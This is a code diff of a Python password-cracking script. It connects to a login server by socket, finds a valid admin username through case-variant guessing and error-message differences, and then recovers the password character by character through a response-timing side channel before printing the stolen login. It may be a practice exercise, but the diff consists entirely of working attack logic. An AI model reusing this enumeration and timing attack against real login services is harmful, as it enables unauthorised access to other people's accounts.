@@ -4,6 +4,7 @@ import itertools
 import requests
 import string
 import json
+import datetime
 
 
 def get_admin_logins():
@@ -21,20 +22,20 @@ class Connect2Server:
         self.message_help = "Message sent to server."
         self.parser = None
         self.args = None
-        self.password = ""
         self.logins = get_admin_logins()
-        self.login = None
+        self.login = {'login': '', 'password': ''}
         self.login_success = False
-        self.connection_success = False
         self.characters = string.ascii_letters + string.digits
         self.client_socket = None
         self.response = None
 
-    def send_request(self, login, password):
-        log_info = json.dumps({'login': login, 'password': password})
-        self.client_socket.send(log_info.encode())
+    def send_request(self):
+        start = datetime.datetime.now()
+        self.client_socket.send(json.dumps(self.login).encode())
         response = json.loads(self.client_socket.recv(1024).decode())
+        time_diff = datetime.datetime.now() - start
         self.response = response['result']
+        return time_diff
 
     def connect(self):
         self.parser = argparse.ArgumentParser(description=self.description)
@@ -50,22 +51,22 @@ class Connect2Server:
                 log_list = [x.lower() + x.upper() if x.isalpha() else x for x in login]
                 log_combinations = itertools.product(*log_list)
                 for loc_login in log_combinations:
-                    self.send_request("".join(loc_login), self.password)
-                    if self.response in ["Wrong password!", "Exception happened during login"]:
-                        self.login = "".join(loc_login)
+                    self.login['login'] = "".join(loc_login)
+                    self.send_request()
+                    if self.response == "Wrong password!":
                         self.login_success = True
                         break
 
-            while not self.connection_success:
+            pw = ""
+            while True:
                 for x in self.characters:
-                    pw = self.password + x
-                    self.send_request(self.login, pw)
-                    if self.response != "Wrong password!":
-                        self.password = pw
-                        if self.response == 'Connection success!':
-                            self.connection_success = True
-                            print(json.dumps({'login': self.login, 'password': self.password}))
-                            return None
+                    self.login['password'] = pw + x
+                    dt = self.send_request()
+                    if self.response == 'Connection success!':
+                        print(json.dumps(self.login))
+                        return None
+                    if dt.total_seconds() > 0.1:
+                        pw += x
                         break
 
 
